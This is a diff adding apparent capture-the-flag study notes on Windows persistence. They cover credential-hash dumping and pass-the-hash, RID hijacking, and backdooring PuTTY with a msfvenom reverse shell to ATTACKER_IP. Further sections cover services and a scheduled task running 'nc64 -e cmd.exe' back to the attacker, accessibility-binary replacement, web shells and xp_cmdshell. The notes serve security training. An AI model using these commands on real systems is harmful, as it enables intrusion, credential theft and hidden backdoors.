@@ -856,13 +856,600 @@ GUI tool for detailed process and system monitoring.
 **Remember:** Initial access gets you in; persistence helps you get back in.
 
 
-### --------------------------------- Maltego -----------------------------------
-### --------------------------------- Maltego -----------------------------------
-### --------------------------------- Maltego -----------------------------------
-### --------------------------------- Maltego -----------------------------------
-### --------------------------------- Maltego -----------------------------------
-### --------------------------------- Maltego -----------------------------------
-### --------------------------------- Maltego -----------------------------------
+### --------------------------------- Tampering With Unprivileged Accounts -----------------------------------
+
+#### **1. Assign Group Memberships**
+
+**Direct method:** Add an unprivileged user to the Administrators group.
+
+```
+net localgroup administrators thmuser0 /add
+```
+
+**Backup Operators method:**
+
+- `Backup Operators` can read/write files while bypassing DACL permissions.
+- Important privileges:
+  - `SeBackupPrivilege` — Read any file.
+  - `SeRestorePrivilege` — Write any file.
+
+```
+net localgroup "Backup Operators" thmuser1 /add
+net localgroup "Remote Management Users" thmuser1 /add
+```
+
+#### **2. UAC Remote Restriction**
+
+- `LocalAccountTokenFilterPolicy` strips administrative privileges from local accounts during remote login.
+- Set it to `1` to prevent this filtering.
+
+```
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
+```
+
+#### **3. SAM and SYSTEM Hash Extraction**
+
+SAM stores local account password hashes. SYSTEM contains information needed to decrypt them.
+
+```
+reg save hklm\system system.bak
+reg save hklm\sam sam.bak
+```
+
+Download both files using Evil-WinRM:
+
+```
+download system.bak
+download sam.bak
+```
+
+Extract hashes:
+
+```
+python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
+```
+
+Pass-the-Hash using Administrator's NTLM hash:
+
+```
+evil-winrm -i MACHINE_IP -u Administrator -H NTLM_HASH
+```
+
+#### **4. Assign Special Privileges Without Group Membership**
+
+Use `secedit` to assign privileges directly to a user.
+
+```
+secedit /export /cfg config.inf
+```
+
+Add the user to the `SeBackupPrivilege` and `SeRestorePrivilege` entries in `config.inf`.
+
+```
+secedit /import /cfg config.inf /db config.sdb
+secedit /configure /db config.sdb /cfg config.inf
+```
+
+**WinRM Security Descriptor:**
+
+A security descriptor controls access to a system resource, similar to an ACL.
+
+```
+Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
+```
+
+Use the GUI to grant the user permission to connect to WinRM.
+
+**Remember:** A user can have powerful privileges without belonging to an administrative group.
+
+#### **5. RID Hijacking**
+
+- RID (Relative Identifier) identifies a user.
+- Administrator's default RID = `500`.
+- Normal users usually have RID `>= 1000`.
+- RID is the last part of a user's SID.
+- Changing a user's RID to `500` can make Windows treat that user as Administrator.
+
+Find user SIDs:
+
+```
+wmic useraccount get name,sid
+```
+
+Run Registry Editor as SYSTEM:
+
+```
+C:\tools\pstools\PsExec64.exe -i -s regedit
+```
+
+Registry location:
+
+```
+HKLM\SAM\SAM\Domains\Account\Users\
+```
+
+- Find the user's key using their RID in hexadecimal.
+- Example: `1010` = `0x3F2`.
+- Edit the `F` value at offset `0x30`.
+- Replace the user's RID with Administrator's RID.
+- RID uses **little-endian** byte order:
+  - `500` = `0x01F4`
+  - Stored as `F401`.
+
+The user receives Administrator-level access after logging in again.
+
+**Key concepts to remember**
+
+| Technique                 | Main idea                                 |
+| ------------------------- | ----------------------------------------- |
+| Administrators group      | Give user admin membership                |
+| Backup Operators          | Read/write protected files                |
+| Special privileges        | Assign backup/restore privileges directly |
+| WinRM security descriptor | Allow remote management access            |
+| RID Hijacking             | Make a user use Administrator's RID       |
+
+
+### --------------------------------- Backdooring Files -----------------------------------
+
+**File backdooring** means modifying files users regularly open so additional code runs while the original file still works normally.
+
+Three techniques:
+
+#### **1. Executable Files (.exe)**
+
+- Modify a commonly used executable, such as PuTTY.
+- `msfvenom` can inject an additional payload while keeping the original program functional.
+
+```
+msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
+```
+
+- `-x` — Original executable.
+- `-k` — Keep original executable running.
+- `-p` — Payload.
+- `-b` — Bad characters.
+- `-o` — Output file.
+
+#### **2. Shortcut Hijacking (.lnk)**
+
+- Change a shortcut's target to a script.
+- The script runs additional code, then opens the original program.
+- Keep the original icon to avoid visible changes.
+- `-WindowStyle hidden` hides the PowerShell window.
+
+**Example shortcut target:**
+
+```
+powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
+```
+
+**Concept:** Original shortcut → Script → Original application.
+
+#### **3. File Association Hijacking**
+
+- Windows stores file associations in the Registry.
+- Registry location:
+
+```
+HKLM\Software\Classes\
+```
+
+- `.txt` identifies the file extension.
+- `ProgID` identifies the associated application.
+- `shell\open\command` stores the command used to open the file.
+
+Example normal command:
+
+```
+%SystemRoot%\system32\NOTEPAD.EXE %1
+```
+
+- `%1` represents the opened file's path.
+- PowerShell uses `$args[0]` to access the file argument.
+
+**Concept:** Modify the file handler so additional code runs while the original application still opens the file.
+
+**Quick Revision**
+
+| Technique                  | What is modified?      |
+| -------------------------- | ---------------------- |
+| Executable backdooring     | `.exe` file            |
+| Shortcut hijacking         | `.lnk` shortcut target |
+| File association hijacking | Registry file handler  |
+
+**Remember:** Persistence through files relies on users regularly opening the modified executable, shortcut, or file type.
+
+
+### --------------------------------- Abusing Services -----------------------------------
+
+#### **Abusing Windows Services**
+
+**Windows services** are background executables that can run automatically when Windows starts. They can be abused for persistence in two ways:
+
+1. Create a new service.
+2. Modify an existing service.
+
+#### **1. Creating a New Service**
+
+Create and start a service:
+
+```
+sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
+sc.exe start THMservice
+```
+
+- `binPath` — Program/command executed by the service.
+- `start= auto` — Starts automatically with Windows.
+- `sc.exe start` — Starts the service.
+
+**Important:** Keep a space after each `=`.
+
+Create a Windows service-compatible executable using MSFVenom:
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
+```
+
+Create service using that executable:
+
+```
+sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
+sc.exe start THMservice2
+```
+
+#### **2. Modifying Existing Services**
+
+Reusing an existing service can avoid creating a new service entry.
+
+**List all services:**
+
+```
+sc.exe query state=all
+```
+
+**Check service configuration:**
+
+```
+sc.exe qc THMService3
+```
+
+Important configuration fields:
+
+| Field                | Purpose                     |
+| -------------------- | --------------------------- |
+| `BINARY_PATH_NAME`   | Executable path             |
+| `START_TYPE`         | Automatic or manual startup |
+| `SERVICE_START_NAME` | Account running the service |
+
+\- `LocalSystem` provides SYSTEM-level privileges.
+
+Create a service-compatible payload:
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
+```
+
+Modify existing service:
+
+```
+sc.exe config THMService3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
+```
+
+Verify configuration:
+
+```
+sc.exe qc THMService3
+```
+
+**Quick Revision**
+
+| Technique           | Main command             |
+| ------------------- | ------------------------ |
+| Create service      | `sc.exe create`          |
+| Start service       | `sc.exe start`           |
+| List services       | `sc.exe query state=all` |
+| Check configuration | `sc.exe qc`              |
+| Modify service      | `sc.exe config`          |
+
+**Remember:** For service persistence, understand the executable path, startup type, and service account.
+
+
+### --------------------------------- Abusing Scheduled Tasks -----------------------------------
+
+**Scheduled Tasks** allow Windows to execute programs automatically at specific times, repeatedly, or when system events occur.
+
+Windows uses `schtasks` to manage scheduled tasks.
+
+#### **1. Creating a Scheduled Task**
+
+Example: Create a task that runs every minute.
+
+```
+schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
+```
+
+**Important options:**
+
+| Option       | Meaning                    |
+| ------------ | -------------------------- |
+| `/create`    | Create task                |
+| `/sc`        | Schedule type              |
+| `/mo 1`      | Every 1 minute             |
+| `/tn`        | Task name                  |
+| `/tr`        | Program/command to execute |
+| `/ru SYSTEM` | Run as SYSTEM              |
+
+**Check task:**
+
+```
+schtasks /query /tn THM-TaskBackdoor
+```
+
+#### **2. Hiding Scheduled Tasks**
+
+- Each scheduled task has a Security Descriptor (SD).
+- SD controls which users can access/query the task.
+- Task security descriptors are stored in:
+
+```
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
+```
+
+- Each task has an `SD` registry value.
+- Removing `SD` makes the task inaccessible to users, including administrators.
+
+Open Registry Editor as SYSTEM:
+
+```
+C:\tools\pstools\PsExec64.exe -s -i regedit
+```
+
+Then locate the task's registry key and delete its `SD` value.
+
+**Remember:** The task may continue running even when users cannot query it.
+
+#### **Quick Revision**
+
+| Concept                  | Purpose                    |
+| ------------------------ | -------------------------- |
+| `schtasks /create`       | Create scheduled task      |
+| `/sc`                    | Set schedule               |
+| `/ru SYSTEM`             | Run with SYSTEM privileges |
+| `schtasks /query`        | Check scheduled tasks      |
+| Security Descriptor (SD) | Controls task access       |
+
+[Microsoft – schtasks documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks?utm_source=chatgpt.com)
+
+
+### --------------------------------- Logon Triggered Persistence -----------------------------------
+
+**Logon persistence** means configuring Windows to execute a program or script whenever a user logs in.
+
+There are four main methods:
+
+#### **1. Startup Folder**
+
+Each user has a separate Startup folder:
+
+```
+C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+```
+
+For all users:
+
+```
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+```
+
+- Programs placed in these folders run when the user logs in.
+- User Startup folder → Current user only.
+- Common Startup folder → All users.
+
+#### **2. Run / RunOnce Registry Keys**
+
+Registry locations:
+
+```
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+```
+
+| Key       | Behavior     |
+| --------- | ------------ |
+| `HKCU`    | Current user |
+| `HKLM`    | All users    |
+| `Run`     | Every login  |
+| `RunOnce` | Only once    |
+
+#### **3. Winlogon**
+
+Winlogon manages the Windows login process.
+
+Registry location:
+
+```
+HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
+```
+
+Important values:
+
+- `Userinit` → Runs `userinit.exe` to load user profile settings.
+- `shell` → Runs the Windows shell, usually `explorer.exe`.
+
+**Remember:** Both values are important for logon persistence.
+
+#### **4. Logon Scripts**
+
+- `userinit.exe` checks the `UserInitMprLogonScript` environment variable during login.
+- This variable can specify a logon script.
+- Each user has separate environment variables.
+
+Registry location:
+
+```
+HKCU\Environment
+```
+
+Value:
+
+```
+UserInitMprLogonScript
+```
+
+**Important:** This method applies only to the current user because there is no equivalent HKLM key.
+
+#### **Quick Revision**
+
+| Method         | Location                     | Scope        |
+| -------------- | ---------------------------- | ------------ |
+| Startup Folder | User Startup folder          | Current user |
+| Common Startup | `C:\ProgramData\...\StartUp` | All users    |
+| Run / RunOnce  | HKCU                         | Current user |
+| Run / RunOnce  | HKLM                         | All users    |
+| Winlogon       | HKLM Winlogon                | System-wide  |
+| Logon Script   | HKCU Environment             | Current user |
+
+**Remember:** All four techniques trigger execution during user login.
+
+
+### --------------------------------- Backdooring the Login Screen / RDP -----------------------------------
+
+Windows accessibility features can be abused to open a command prompt from the login screen without entering credentials.
+
+Two methods:
+
+#### **1. Sticky Keys (**`sethc.exe`**)**
+
+- Sticky Keys allows key combinations to be pressed sequentially.
+- Pressing `SHIFT` five times activates Sticky Keys.
+- Windows executes:
+
+```
+C:\Windows\System32\sethc.exe
+```
+
+- Replacing `sethc.exe` with `cmd.exe` opens CMD from the login screen.
+- The resulting CMD runs with **SYSTEM privileges**.
+
+Important commands:
+
+```
+takeown /f C:\Windows\System32\sethc.exe
+icacls C:\Windows\System32\sethc.exe /grant Administrator:F
+```
+
+#### **2. Utilman (**`Utilman.exe`**)**
+
+- Utilman provides Ease of Access options on the Windows login screen.
+- Clicking the Ease of Access button executes:
+
+```
+C:\Windows\System32\Utilman.exe
+```
+
+\- Replacing it with `cmd.exe` opens CMD from the login screen with **SYSTEM privileges**.
+
+Important commands:
+
+```
+takeown /f C:\Windows\System32\utilman.exe
+icacls C:\Windows\System32\utilman.exe /grant Administrator:F
+```
+
+#### **Quick Revision**
+
+| Method      | Trigger              | Executable    |
+| ----------- | -------------------- | ------------- |
+| Sticky Keys | Press SHIFT 5 times  | `sethc.exe`   |
+| Utilman     | Click Ease of Access | `Utilman.exe` |
+
+**Remember:**
+
+- `takeown` → Take file ownership.
+- `icacls` → Modify file permissions.
+- Both techniques abuse accessibility executables to obtain SYSTEM-level CMD access before login.
+
+
+### --------------------------------- Persisting Through Existing Services -----------------------------------
+
+#### **Persisting Through Existing Services**
+
+Persistence can be established by abusing existing applications and services that execute user-controlled code.
+
+Two methods covered:
+
+#### **1. Web Shells (IIS)**
+
+- Upload an ASP.NET web shell into the IIS webroot.
+- Default IIS webroot:
+
+```
+C:\inetpub\wwwroot
+```
+
+- Default IIS application pool identity: `iis apppool\defaultapppool`.
+- This account may have `SeImpersonatePrivilege`, which can be relevant to Windows privilege escalation.
+
+Useful references:
+
+- [ASP.NET Web Shell](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx?utm_source=chatgpt.com)
+- [Windows PrivEsc Room](https://tryhackme.com/room/windowsprivesc20?utm_source=chatgpt.com)
+
+**Detection:** Blue teams may monitor web directories for unexpected file changes.
+
+#### **2. MSSQL Backdoor (Triggers)**
+
+**Important concepts:**
+
+- **Trigger:** Executes automatically when a database event occurs.
+- `xp_cmdshell`**:** MSSQL stored procedure that executes Windows commands.
+- `sa`**:** Default SQL Server administrator login.
+- `IMPERSONATE`**:** Allows a database principal to act as another login.
+
+**Enable advanced options and&#x20;**`xp_cmdshell`**:**
+
+```
+sp_configure 'Show Advanced Options',1;
+RECONFIGURE;
+GO
+
+sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
+GO
+```
+
+**Trigger concept:**
+
+- Create a trigger on `HRDB.dbo.Employees`.
+- Trigger event: `INSERT`.
+- The trigger executes when a new employee record is inserted.
+- It can invoke `xp_cmdshell` to execute system commands.
+
+**Remember:** A database action can trigger code execution on the underlying Windows host.
+
+#### **Quick Revision**
+
+| Technique                | Persistence mechanism                                |
+| ------------------------ | ---------------------------------------------------- |
+| Web Shell                | Web server executes uploaded server-side file        |
+| MSSQL Trigger            | Database event executes configured commands          |
+| `xp_cmdshell`            | Runs Windows commands through MSSQL                  |
+| `SeImpersonatePrivilege` | Important privilege for Windows privilege escalation |
+
+
+
+
+## Lateral Movement and Pivoting
+
+### [LMP](https://github.com/OxL3on/HackTheBox/tree/main/CPTS/Pivoting%2C%20Tunneling%2C%20and%20Port%20Forwarding/TryHackMe)
+
+
+
+
+
 ### --------------------------------- Maltego -----------------------------------
 ### --------------------------------- Maltego -----------------------------------
 ### --------------------------------- Maltego -----------------------------------
